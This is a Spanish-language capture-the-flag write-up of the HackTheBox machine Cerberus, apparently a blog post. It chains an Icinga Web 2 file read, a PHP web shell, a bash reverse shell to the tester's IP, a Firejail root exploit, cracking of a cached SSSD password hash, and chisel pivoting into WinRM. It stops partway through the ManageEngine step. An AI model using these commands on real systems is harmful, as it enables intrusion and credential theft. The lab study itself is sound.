@@ -1,0 +1,835 @@
+---
+title: "Máquina Cerberus"
+description: "Resolución de la máquina Cerberus de HackTheBox"
+logo: "/assets/writeups/cerberus/logo.png"
+categories: ["HackTheBox", "Hard", "Windows"]
+tags: ["CVE-2022-24716","CVE-2022-24715","CVE-2022-31214","SSS Dumping","Pivoting","CVE-2022-47966"]
+---
+
+En esta máquina Windows encontraremos un servidor Linux con un Icinga Web 2 vulnerable a dos CVEs que nos permitirán acceder como www-data a la máquina, nos convertiremos en root abusando del CVE-2022-31214 de Firejail para dumpear credenciales almacenadas en la instalación de SSS y conectarnos al servicio WinRM del host anfitrión. Finalmente obtendremos privilegios de `nt authority/system` abusando del CVE-2022-47966.
+
+## Reconocimiento
+
+La máquina tiene... ¿un solo puerto?
+
+```bash
+# Nmap 7.93 scan initiated Sat Mar 18 17:51:45 2023 as: nmap -sCV -vvv -Pn -n -p 8080 -oN services 10.10.11.205
+Nmap scan report for 10.10.11.205
+Host is up, received user-set (0.16s latency).
+Scanned at 2023-03-18 17:51:45 -04 for 13s
+
+PORT     STATE SERVICE REASON         VERSION
+8080/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-open-proxy: Proxy might be redirecting requests
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to http://icinga.cerberus.local:8080/icingaweb2
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Mar 18 17:51:58 2023 -- 1 IP address (1 host up) scanned in 13.11 seconds
+```
+
+El puerto que nos responde también nos reporta que es un servidor Apache corriendo en Ubuntu redirigiendonos al dominio "icinga.cerberus.local", esto no es algo bizarro; simplemente el servidor Windows parece estar corriendo una máquina virtual (o sistema invitado) la cual tiene expuesta al exterior, mientras que los puertos de la máquina real parecen estar filtrados. Con esto podemos suponer que al compromoter el servidor Linux si vamos a poder comunicarnos con el anfitrión.
+
+Ahora, ¿qué tiene ese servidor Linux? parece un simple portal del software [Icinga Web 2](https://github.com/Icinga/icingaweb2)
+
+![Web](/assets/writeups/cerberus/1.png)
+
+A ver que le sacamos...
+
+## Intrusión
+
+### www-data - icinga (Ubuntu 22.04 Jammy)
+
+Lo único que podemos sacar respecto a la versión de este servicio web es la fecha que se nos muestra en la página de autenticación (2013-2023), al no tener otra información nos tocará buscar vulnerabilidades conocidas... y en eso nos encontramos [este articulo de SonarSource](https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/) que nos da contexto sobre una vulnerabilidad de tipo AFR (Arbitrary File Read) en el cargador de assets de librerias del software. Si probamos para ver si esta interfaz es vulnerable haciendo que nos devuelva el archivo `/etc/passwd` podremos ver que en efecto, es vulnerable
+
+```bash
+❯ curl -v "http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/passwd"
+*   Trying 10.10.11.205:8080...
+* Connected to icinga.cerberus.local (10.10.11.205) port 8080 (#0)
+> GET /icingaweb2/lib/icinga/icinga-php-thirdparty/etc/passwd HTTP/1.1
+> Host: icinga.cerberus.local:8080
+> User-Agent: curl/8.1.2
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Wed, 02 Aug 2023 17:10:29 GMT
+< Server: Apache/2.4.52 (Ubuntu)
+< Cache-Control: public, max-age=1814400, stale-while-revalidate=604800
+< Etag: 4019d-6b5-5f361871179c0
+< Last-Modified: Sun, 29 Jan 2023 06:51:27 GMT
+< Vary: Accept-Encoding
+< Transfer-Encoding: chunked
+< Content-Type: text/plain;charset=UTF-8
+< 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+... [snip]
+```
+
+Podemos leer archivos del servidor, ahora debemos buscar algún archivo que pueda tener credenciales para esta interfaz, si buscamos en la documentación de Icinga2 veremos que la configuración de la interfaz web se encuentra en `/etc/icingaweb2/config.ini`. Introduciendo dicha ruta obtendremos el archivo que buscamos
+
+```bash
+*   Trying 10.10.11.205:8080...
+* Connected to icinga.cerberus.local (10.10.11.205) port 8080 (#0)
+> GET /icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/config.ini HTTP/1.1
+> Host: icinga.cerberus.local:8080
+> User-Agent: curl/8.1.2
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Wed, 02 Aug 2023 17:14:45 GMT
+< Server: Apache/2.4.52 (Ubuntu)
+< Cache-Control: public, max-age=1814400, stale-while-revalidate=604800
+< Etag: 43c7b-11d-601f3bbe08c40
+< Last-Modified: Wed, 02 Aug 2023 17:10:01 GMT
+< Vary: Accept-Encoding
+< Transfer-Encoding: chunked
+< Content-Type: text/plain;charset=UTF-8
+< 
+[global]
+show_stacktraces = "1"
+show_application_state_messages = "1"
+config_backend = "db"
+config_resource = "icingaweb2"
+module_path = "/usr/share/icingaweb2/modules/"
+
+[logging]
+log = "syslog"
+level = "ERROR"
+application = "icingaweb2"
+facility = "user"
+
+[themes]
+
+[authentication]
+* Connection #0 to host icinga.cerberus.local left intact
+```
+
+No solo está ese fichero, si no otros como `resources.ini`, `authentication.ini` y `resources.ini`, justamente revisando el último mencionado encontramos credenciales
+
+```ini
+[icingaweb2]
+type = "db"
+db = "mysql"
+host = "localhost"
+dbname = "icingaweb2"
+username = "matthew"
+password = "IcingaWebPassword2023"
+use_ssl = "0"
+```
+{: file="resources.ini"}
+
+Probando estas credenciales obtenemos acceso al panel web de Icinga
+
+![Web panel](/assets/writeups/cerberus/2.png)
+
+Continuando con el post de SonarSource, si bajamos nos cuentan sobre vulnerabilidad RCE que tiene lo siguiente de contexto:
+
+> *Si un adversario usa secuencias de navegación de directorios con una ruta y nombre de archivo alternativos (../../../badfolder/badfile.php) en el campo de usuario de la llave para escribir una llave SSH fuera del directorio actual y a la vez engaña a la implementación nativa de OpenSSL introduciendo en el contenido de la llave `file://A\x00<?php echo 'bad code'; ?>` donde A es la ruta hacia un certificado PEM/llave SSH y \x00 un null byte, podrá escribir en las rutas en donde el usuario que corre el servicio tenga permisos, un archivo con código PHP que posteriormente podrá importar y ejecutar usando la función de modulos de la misma interfaz de Icinga Web 2.*
+
+Usando la vulnerabilidad AFR que encontramos anteriormente podríamos buscar por certificados válidos, pero algo que nos facilita aún más la tarea es que nosotros podemos crear de por si llaves SSH en el mismo panel que se almacenarán en el servidor.
+
+Al crear una, esta se nos guardará en la ruta `/etc/icingaweb2/ssh/<username>`
+
+```bash
+❯ curl -s "http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/ssh/matthew"
+-----BEGIN PRIVATE KEY-----
+MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCkm1tbst0LFDDo
+djGNNiLLwNkZDDvkZbSqF6B8JYhGHclO2SrzsdYUgss17P/rRk5RPVGaj5rCwUt8
+rqWSV27aMuR62gnDPoRSDOX2IcOM1WXsrfBDios10hXbkgS9we65yJrA81Y0wniV
+hab3tTBjeIsGLjqhsFkjc7czR9Zyq8gdcMwYGIhEZ37OrYDqnp366/7iW5ewSCRJ
+... [snip]
+```
+
+Antes de continuar debemos saber que se carga primero en un modulo de esta interfaz web; buscando por GitHub [encontramos una página](https://github.com/Icinga/icingaweb2-module-training/blob/master/doc/extending-icinga-web-2.md) que especificamente ayuda a crear modulos y nos muestra una estructura parecida a esta
+
+```bash
+.
+└── training                Basic directory of the module
+    ├── application
+    │   ├── clicommands     CLI Commands
+    │   ├── controllers     Web Controller
+    │   ├── forms           Forms
+    │   ├── locale          Translations
+    │   └── views
+    │       ├── helpers     View Helper
+    │       └── scripts     View Scripts
+    ├── configuration.php   Deploy menu, dashlets, permissions
+    ├── doc                 Documentation
+    ├── library
+    │   └── Training        Library Code, Module Namespace
+    ├── module.info         Module Metadata
+    ├── public
+    │   ├── css             Own CSS Code
+    │   ├── img             Own Images
+    │   └── js              Own JavaScript
+    ├── run.php             Registration of hooks and more
+    └── test
+        └── php             PHP Unit Tests
+```
+
+El `configuration.php` y `run.php` llaman la atención, usaremos el primero.
+
+Ahora podemos intentar crear otra llave SSH pero con el siguiente contenido, el null byte se lo agregaremos editando la petición por medio de BurpSuite u otro interceptor de peticiones.
+
+![Content](/assets/writeups/cerberus/3.png)
+
+Al hacerlo, el servidor creará la llave sin problemas pero si miramos en la ruta que le definimos:
+
+```bash
+❯ curl --output - "http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/dev/shm/configuration.php"
+file:///etc/icingaweb2/ssh/matthew<?php system($_GET['a']); ?>
+```
+> Nota: Hay un modo más sencillo de lograr escribir el fichero con código PHP, lo explicaré en el Extra.
+{: .prompt-info}
+
+Hay que buscar como incluir ese archivito, en Configuration -> Application podemos ver un ajuste que nos permite cambiar la carpeta de modulos para cargar, al colocarle /dev, guardar y dirigirnos a la parte de módulos, nos muestra los ficheros de dicha carpeta y también el shm...
+
+![shm](/assets/writeups/cerberus/4.png)
+
+Al momento de pinchar en el, la página nos muestra un error
+
+```h
+Undefined index: a
+
+#0 /dev/shm/configuration.php(1): Icinga\Application\ApplicationBootstrap->Icinga\Application\{closure}()
+#1 /usr/share/php/Icinga/Application/Modules/Module.php(1573): include(String)
+#2 /usr/share/php/Icinga/Application/Modules/Module.php(1591): Icinga\Application\Modules\Module->includeScript()
+#3 /usr/share/php/Icinga/Application/Modules/Module.php(1182): Icinga\Application\Modules\Module->launchConfigScript()
+#4 /usr/share/icingaweb2/application/controllers/ConfigController.php(162): Icinga\Application\Modules\Module->getConfigTabs()
+#5 /usr/share/icingaweb2/library/vendor/Zend/Controller/Action.php(507): Icinga\Controllers\ConfigController->moduleAction()
+#6 /usr/share/php/Icinga/Web/Controller/Dispatcher.php(76): Zend_Controller_Action->dispatch()
+#7 /usr/share/icingaweb2/library/vendor/Zend/Controller/Front.php(937): Icinga\Web\Controller\Dispatcher->dispatch()
+#8 /usr/share/php/Icinga/Application/Web.php(304): Zend_Controller_Front->dispatch()
+#9 /usr/share/php/Icinga/Application/webrouter.php(107): Icinga\Application\Web->dispatch()
+#10 /usr/share/icingaweb2/public/index.php(4): require_once(String)
+#11 {main}
+```
+
+Podemos asumir que no encuentra el parámetro "a" en la petición GET, ya que en la cadena que metimos pusimos para que ejecute el comando que se encuentre en el parámetro a de la petición. Si intentamos colocárselo al final de la URL ahora si carga y podremos ver el resultado del comando.
+
+![id](/assets/writeups/cerberus/5.png)
+
+Vamos a lanzarnos una reverse shell introduciendo lo siguiente en la URL
+
+`http://icinga.cerberus.local:8080/icingaweb2/config/modules#!/icingaweb2/config/module?name=shm&a=bash -c "bash -i >%26 /dev/tcp/10.10.16.59/443 0>%261"`
+
+```bash
+❯ nc -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.205 49800
+bash: cannot set terminal process group (629): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@icinga:/usr/share/icingaweb2/public$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+www-data@icinga:/usr/share/icingaweb2/public$ ^Z
+[1]  + 3825 suspended  nc -lvnp 443
+❯ stty raw -echo ;fg
+[1]  + 3825 continued  nc -lvnp 443
+                                   reset xterm
+www-data@icinga:/usr/share/icingaweb2/public$ export TERM=xterm-256color
+www-data@icinga:/usr/share/icingaweb2/public$ source /etc/skel/.bashrc
+www-data@icinga:/usr/share/icingaweb2/public$ stty rows 36 columns 149
+```
+
+Esta máquina tiene asignada la dirección IPv4 `172.16.22.2` en la red virtual de lo que podemos asumir, es [Hyper-V](https://es.wikipedia.org/wiki/Hyper-V)
+
+```bash
+www-data@icinga:/$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:15:5d:5f:e8:01 brd ff:ff:ff:ff:ff:ff
+    inet 172.16.22.2/28 brd 172.16.22.15 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::215:5dff:fe5f:e801/64 scope link 
+       valid_lft forever preferred_lft forever
+```
+
+Si intentamos hacerle un ping a `172.16.22.1`, nos responderá con un TTL de 128, por lo que ya podemos ver que esa si es Cerberus. Vamos a utilizar un binario estático de nmap para enumerar los puertos del anfitrión:
+
+```bash
+www-data@icinga:/tmp$ ./nmap -p- --open -Pn -n -vvv --min-rate 5000 172.16.22.1
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-08-02 22:52 UTC
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Initiating Connect Scan at 22:52
+Scanning 172.16.22.1 [65535 ports]
+Connect Scan Timing: About 22.55% done; ETC: 22:55 (0:01:46 remaining)
+Connect Scan Timing: About 44.70% done; ETC: 22:55 (0:01:15 remaining)
+Connect Scan Timing: About 66.72% done; ETC: 22:55 (0:00:45 remaining)
+Discovered open port 5985/tcp on 172.16.22.1
+Completed Connect Scan at 22:54, 119.76s elapsed (65535 total ports)
+Nmap scan report for 172.16.22.1
+Host is up, received user-set (0.034s latency).
+Scanned at 2023-08-02 22:52:48 UTC for 120s
+Not shown: 65534 filtered ports
+Reason: 65534 no-responses
+PORT     STATE SERVICE REASON
+5985/tcp open  unknown syn-ack
+
+Read data files from: /etc
+Nmap done: 1 IP address (1 host up) scanned in 119.78 seconds
+```
+
+WinRM, y tenemos unas credenciales para probar... además parece que esta máquina cuenta con el set [sssd](https://en.wikipedia.org/wiki/System_Security_Services_Daemon) para probablemente vincularse con la máquina Windows, por lo que pueden haber otras cosas más por ahí.
+
+```bash
+www-data@icinga:/tmp$ sssd
+Running under 33, must be root
+www-data@icinga:/tmp$ ls -la /etc | grep sssd
+drwx--x--x  3 root     root        4096 Mar  1 12:05 sssd
+```
+
+### root - icinga (Ubuntu 22.04 Jammy)
+
+Para husmear por las carpetas del sssd necesitamos convertirnos en root, buscando por binarios SUID encontramos uno extraño llamado `firejail`
+
+```bash
+www-data@icinga:/tmp$ find / -perm -4000 2>/dev/null
+/usr/sbin/ccreds_chkpwd
+/usr/bin/mount
+/usr/bin/sudo
+/usr/bin/firejail
+/usr/bin/chfn
+/usr/bin/fusermount3
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/ksu
+/usr/bin/pkexec
+/usr/bin/chsh
+/usr/bin/su
+/usr/bin/umount
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/libexec/polkit-agent-helper-1
+```
+
+Ese extraño programa es para crear entornos aislados del sistema real así como Docker, la versión es la 0.9.68rc1 y es vulnerable al CVE-2022-31214. Existe un [PoC](https://www.openwall.com/lists/oss-security/2022/06/08/10/1) de esta falla asi que vamos a utilizarlo, al ejecutarlo nos dice que nos unamos al namespace de un PID en otra consola donde se supone deberíamos tener el su sin restricciones por una política del PAM. Vamos a tener que crearnos otra reverse shell para poder abusar de la vulnerabilidad
+
+```bash
+You can now run 'firejail --join=11066' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
+```
+  *Terminal 1*
+
+```bash
+www-data@icinga:/tmp$ firejail --join=11066
+changing root to /proc/11066/root
+Warning: cleaning all supplementary groups
+Child process initialized in 15.20 ms
+www-data@icinga:/tmp$
+```
+  *Terminal 2*
+
+En la segunda terminal, usando `su -` ya nos podremos convertir en root. Hecho esto ya podemos cerrar la primera terminal
+
+```bash
+www-data@icinga:/tmp$ su -
+root@icinga:~#
+```
+
+### matthew - DC$/cerberus.local (Windows Server 2019)
+
+Buscando por archivos del SSSD, encontramos algo interesante en `/var/lib/sss`
+
+```bash
+root@icinga:/var/lib/sss# ls -la
+total 40
+drwxr-xr-x 10 root root 4096 Jan 22  2023 .
+drwxr-xr-x 38 root root 4096 Jan 29  2023 ..
+drwx------  2 root root 4096 Mar  2 12:33 db
+drwxr-x--x  2 root root 4096 Oct  4  2022 deskprofile
+drwxr-xr-x  2 root root 4096 Oct  4  2022 gpo_cache
+drwx------  2 root root 4096 Oct  4  2022 keytabs
+drwxrwxr-x  2 root root 4096 Aug  2 05:44 mc
+drwxr-xr-x  3 root root 4096 Aug  2 05:44 pipes
+drwxr-xr-x  3 root root 4096 Aug  2 22:52 pubconf
+drwx------  2 root root 4096 Jan 22  2023 secrets
+```
+
+El directorio `db` tiene varios archivos de caché, con formato TDB
+
+```bash
+root@icinga:/var/lib/sss/db# ls -la
+total 5036
+drwx------  2 root root    4096 Mar  2 12:33 .
+drwxr-xr-x 10 root root    4096 Jan 22  2023 ..
+-rw-r--r--  1 root root 1286144 Aug  2 05:44 cache_cerberus.local.ldb
+-rw-------  1 root root    2715 Mar  2 12:33 ccache_CERBERUS.LOCAL
+-rw-------  1 root root 1286144 Aug  2 05:44 config.ldb
+-rw-------  1 root root 1286144 Jan 22  2023 sssd.ldb
+-rw-r--r--  1 root root 1286144 Mar  1 12:07 timestamps_cerberus.local.ldb
+root@icinga:/var/lib/sss/db# file cache_cerberus.local.ldb 
+cache_cerberus.local.ldb: TDB database version 6, little-endian hash size 10000 bytes
+```
+
+Vamos a llevarnos el fichero `cache_cerberus.local.ldb` a nuestro equipo, necesitaremos una herramienta llamada `tdbtool` para inspeccionar este archivo, mirando por los valores almacenados encontramos varios interesantes
+
+```bash
+tdb> keys
+key 21 bytes: DN=@INDEX:CN:CERTMAP
+key 25 bytes: DN=@INDEX:GIDNUMBER:1000
+key 12 bytes: DN=@MODULES
+key 39 bytes: DN=CN=USERS,CN=CERBERUS.LOCAL,CN=SYSDB
+key 15 bytes: DN=@ATTRIBUTES
+key 19 bytes: DN=@INDEX:CN:USERS
+key 28 bytes: DN=@INDEX:CN:CERBERUS.LOCAL
+key 22 bytes: DN=CN=RANGES,CN=SYSDB
+key 23 bytes: DN=@INDEX:CN:SUDORULES
+key 19 bytes: DN=@INDEX:CN:SYSDB
+key 30 bytes: DN=CN=CERBERUS.LOCAL,CN=SYSDB
+key 20 bytes: DN=@INDEX:CN:GROUPS
+key 13 bytes: DN=@BASEINFO
+key 25 bytes: DN=@INDEX:UIDNUMBER:1000
+key 67 bytes: DN=NAME=matthew@cerberus.local,CN=USERS,CN=CERBERUS.LOCAL,CN=SYSDB
+key 33 bytes: DN=@INDEX:OBJECTCLASS:ID_MAPPING
+key 32 bytes: DN=@INDEX:LASTUPDATE:1677672476
+key 12 bytes: DN=CN=SYSDB
+key 53 bytes: DN=CN=SUDORULES,CN=CUSTOM,CN=CERBERUS.LOCAL,CN=SYSDB
+key 32 bytes: DN=@INDEX:DATAEXPIRETIMESTAMP:0
+key 97 bytes: DN=OBJECTSID=S-1-5-21-4088429403-1159899800-2753317549,CN=ID_MAPPINGS,CN=CERBERUS.LOCAL,CN=SYSDB
+key 20 bytes: DN=@INDEX:CN:RANGES
+key 23 bytes: DN=CN=CERTMAP,CN=SYSDB
+key 38 bytes: DN=@INDEX:NAME:matthew@cerberus.local
+key 14 bytes: DN=@INDEXLIST
+key 40 bytes: DN=CN=GROUPS,CN=CERBERUS.LOCAL,CN=SYSDB
+key 30 bytes: DN=@INDEX:NAME:cerberus.local
+```
+
+Usando el comando `dump` podemos ver todos los valores de la llaves, y viendo el de `DN=NAME=matthew@cerberus.local,CN=USERS,CN=CERBERUS.LOCAL,CN=SYSDB` podemos ver un tipo de hash...
+
+```bash
+... [snip]
+[130] 45 78 70 69 72 65 54 69  6D 65 73 74 61 6D 70 00  ExpireTi mestamp
+[140] 01 00 00 00 01 00 00 00  30 00 63 61 63 68 65 64  ....... 0.cached
+[150] 50 61 73 73 77 6F 72 64  00 01 00 00 00 6A 00 00  Password .....j.
+[160] 00 24 36 24 36 4C 50 39  67 79 69 58 4A 43 6F 76  .$6$6LP9 gyiXJCov
+[170] 61 70 63 79 24 30 71 6D  5A 54 54 6A 70 39 66 32  apcy$0qm ZTTjp9f2
+[180] 41 30 65 37 6E 34 78 6B  30 4C 36 5A 6F 65 4B 68  A0e7n4xk 0L6ZoeKh
+[190] 68 61 43 4E 6D 30 56 47  4A 6E 58 2F 4D 75 36 30  haCNm0VG JnX/Mu60
+[1A0] 38 51 6B 6C 69 4D 70 49  79 31 46 77 4B 5A 6C 79  8QkliMpI y1FwKZly
+[1B0] 55 4A 41 5A 55 33 46 5A  33 2E 47 51 2E 34 4E 36  UJAZU3FZ 3.GQ.4N6
+[1C0] 62 62 39 70 78 45 33 74  33 54 30 00 63 61 63 68  bb9pxE3t 3T0.cach
+[1D0] 65 64 50 61 73 73 77 6F  72 64 54 79 70 65 00 01  edPasswo rdType..
+[1E0] 00 00 00 01 00 00 00 31  00 6C 61 73 74 43 61 63  .......1 .lastCac
+[1F0] 68 65 64 50 61 73 73 77  6F 72 64 43 68 61 6E 67  hedPassw ordChang
+[200] 65 00 01 00 00 00 0A 00  00 00 31 36 37 37 36 37  e...... ..167767
+[210] 32 34 37 36 00 66 61 69  6C 65 64 4C 6F 67 69 6E  2476.fai ledLogin
+[220] 41 74 74 65 6D 70 74 73  00 01 00 00 00 01 00 00  Attempts .......
+[230] 00 30 00                                          .0 
+... [snip]
+```
+
+Usaremos la herramienta `strings` para extraerlo en una sola línea, ya que es una cadena en texto plano
+
+```bash
+❯ strings cache.cerberus.ldb
+TDB file
+&DN=CN=SUDORULES,CN=CUSTOM,CN=CERBERUS.LOCAL,CN=SYSDB
+cn=sudorules,cn=custom,cn=cerberus.local,cn=sysdb
+sudorules
+sudoLastFullRefreshTime
+1677760424
+... [snip]
+TRUE
+lastUpdate
+1677672476
+dataExpireTimestamp
+initgrExpireTimestamp
+cachedPassword
+$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0
+cachedPasswordType
+lastCachedPasswordChange
+1677672476
+failedLoginAttempts
+... [snip]
+```
+
+El hash es de tipo SHA-512, va a tomarnos un rato crackearlo (si es una contraseña débil); afortunadamente dicha contraseña está en las primeras lineas de nuestro diccionario favorito
+
+```bash
+❯ hashcat -m 1800 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+... [snip]
+Host memory required for this attack: 0 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+* Passwords.: 14344384
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+
+$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0:147258369
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
+Hash.Target......: $6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCN...E3t3T0
+Time.Started.....: Thu Aug  3 14:25:43 2023 (3 secs)
+Time.Estimated...: Thu Aug  3 14:25:46 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:      370 H/s (8.35ms) @ Accel:64 Loops:512 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 512/14344384 (0.00%)
+Rejected.........: 0/512 (0.00%)
+Restore.Point....: 448/14344384 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4608-5000
+Candidate.Engine.: Device Generator
+Candidates.#1....: lover -> letmein
+Hardware.Mon.#1..: Temp: 80c Util: 97%
+
+Started: Thu Aug  3 14:24:45 2023
+Stopped: Thu Aug  3 14:25:48 2023
+```
+
+Ahora, tenemos que acceder al servicio WinRM para probar esta credencial, pero como solamente la máquina Linux puede ver ese servicio vamos a necesitar de [chisel](https://github.com/jpillora/chisel) para efectuar una redirección de puertos hacia nuestra máquina.
+
+Subamos el binario a la máquina para mandarnos el puerto, un simple servidor http de Python bastará para poder hacerlo
+
+```bash
+root@icinga:~/.local# wget http://10.10.16.59:8000/chisel
+--2023-08-03 18:39:37--  http://10.10.16.59:8000/chisel
+Connecting to 10.10.16.59:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 8384512 (8.0M) [application/octet-stream]
+Saving to: 'chisel'
+
+chisel              100%[===================>]   8.00M   473KB/s    in 90s     
+
+2023-08-03 18:41:08 (90.8 KB/s) - 'chisel' saved [8384512/8384512]
+```
+
+Ahora, ejecutemóslo en nuestra máquina y la comprometida
+
+```bash
+❯ ./chisel server -reverse -p 8081
+2023/08/03 14:42:29 server: Reverse tunnelling enabled
+2023/08/03 14:42:29 server: Fingerprint 7P9BpPVkAAJSXYibUTWKa2PFBn7nisoMxMO9gckqc28=
+2023/08/03 14:42:29 server: Listening on http://0.0.0.0:8081
+```
+
+```bash
+root@icinga:~/.local# ./chisel client 10.10.16.59:8081 R:172.16.22.1:5985 
+```
+> Utilizo el puerto 8081 para chisel ya que BurpSuite ocupa el 8080.
+{: .prompt-tip }
+
+Desde nuestra máquina ahora podremos interactuar con WinRM, y probando comprobamos que las credenciales son correctas
+
+```bash
+❯ evil-winrm -i 127.0.0.1 -u matthew -p 147258369
+
+Evil-WinRM shell v3.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\matthew\Documents>
+```
+
+Como siempre, la flag está en la carpeta Desktop.
+
+```powershell
+*Evil-WinRM* PS C:\Users\matthew\Desktop> ls -Force
+
+
+    Directory: C:\Users\matthew\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a-hs-        1/22/2023  11:22 AM            282 desktop.ini
+-ar---         8/2/2023  10:43 PM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\matthew\Desktop> cat user.txt
+cb37f170c2a6808df1e2fd9d51******
+```
+
+## Escalada de privilegios
+
+Hay unos cuantos puertos extraños abiertos por el protocolo TCP escuchando en todas las interfaces
+
+```powershell
+*Evil-WinRM* PS C:\Users\matthew\Desktop> netstat -p tcp -nat
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           Offload State
+
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       InHost
+  ... [snip]
+  TCP    0.0.0.0:808            0.0.0.0:0              LISTENING       InHost
+  TCP    0.0.0.0:1500           0.0.0.0:0              LISTENING       InHost
+  TCP    0.0.0.0:1501           0.0.0.0:0              LISTENING       InHost
+  ... [snip]
+  TCP    0.0.0.0:8888           0.0.0.0:0              LISTENING       InHost
+  TCP    0.0.0.0:9251           0.0.0.0:0              LISTENING       InHost
+  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       InHost
+  ... [snip]
+```
+
+En la carpeta `Program Files (x86)` existe una carpeta llamada "ManageEngine" con otro directorio "AD Self Service Plus"
+
+```powershell
+*Evil-WinRM* PS C:\Users\matthew\Desktop> ls "C:\Program Files (x86)"
+
+
+    Directory: C:\Program Files (x86)
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        9/15/2018  12:28 AM                Common Files
+d-----         8/3/2023   1:09 PM                Google
+d-----         9/7/2022   4:34 AM                Internet Explorer
+d-----        1/29/2023  11:12 AM                ManageEngine
+d-----        9/15/2018  12:19 AM                Microsoft.NET
+d-----        8/24/2021   7:47 AM                Windows Defender
+d-----        8/24/2021   7:47 AM                Windows Mail
+d-----         9/7/2022   4:34 AM                Windows Media Player
+d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
+d-----        9/15/2018  12:28 AM                windows nt
+d-----        8/24/2021   7:47 AM                Windows Photo Viewer
+d-----        9/15/2018  12:19 AM                Windows Portable Devices
+d-----        9/15/2018  12:19 AM                WindowsPowerShell
+
+
+*Evil-WinRM* PS C:\Users\matthew\Desktop> ls "C:\Program Files (x86)\ManageEngine"
+
+
+    Directory: C:\Program Files (x86)\ManageEngine
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        2/14/2023   6:46 AM                ADSelfService Plus
+```
+
+Buscando por internet vemos que es una aplicación web del estilo auto servicio para la seguridad de empresas. Cuenta con carácteristicas como un gestor de contraseñas, SSO (Single e Sign-On) y una política Zero Trust.
+
+Mirando por los archivos vemos que es la versión 6.2, y el puerto por defecto que utiliza es el 8888... vamos a pasárnoslo a nuestro equipo con Chisel también, pero en vez de redirigirnos un solo puerto vamos a hacer que la máquina actue como un proxy para nosotros poniendo de parámetro en el cliente `R:socks`
+
+```powershell
+*Evil-WinRM* PS C:\Users\matthew\AppData\Local\Temp> curl -o thingy.exe http://10.10.16.59:8000/chisel.exe
+*Evil-WinRM* PS C:\Users\matthew\AppData\Local\Temp> .\thingy.exe client 10.10.16.59:8081 R:socks
+```
+
+Para utilizar este proxy que por defecto Chisel, expondrá en el puerto 1080 a través del protocolo SOCKS5 vamos a requerir de alguna extensión de navegador o software que nos permita hacer conexiones a través de él. Yo en mi caso utilizaré el [FoxyProxy](https://addons.mozilla.org/es/firefox/addon/foxyproxy-standard/) de Firefox.
+
